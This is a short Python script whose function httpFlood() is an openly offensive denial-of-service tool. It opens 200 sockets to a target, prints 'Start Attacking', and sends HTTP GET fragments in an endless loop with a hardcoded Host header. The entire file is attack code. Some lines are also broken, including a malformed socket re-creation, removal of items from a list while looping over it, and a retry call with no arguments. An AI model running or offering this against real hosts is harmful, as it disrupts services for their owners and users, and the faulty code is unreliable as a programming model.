import socket
import time


def httpFlood(target, port = 80):
    try:
        sockets = []
        #==Changeable Params==
        numberOfSockets = 200
        ip = target
        timeToSleep = 1
        #=====================

        print("Creating sockets...")
        for i in range(numberOfSockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                sockets.append(s)
            except Exception as e:
                print(e)
 
        print("Start Attacking " + ip)
        while True:
            for s in sockets:
                try:
                    print("Sending Packet...")
                    s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (ip, port))
                    s.sendto(("Host: 10.0.7.1" + "\r\n\r\n").encode("ascii"), (ip, port))
                except:
                    sockets.remove(s)
                    try:
                        s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((ip,port))
                    except:
                        pass
            print("sleeping for " + str(timeToSleep) + " seconds.")
            time.sleep(timeToSleep)
            
    except ConnectionRefusedError:
        httpFlood()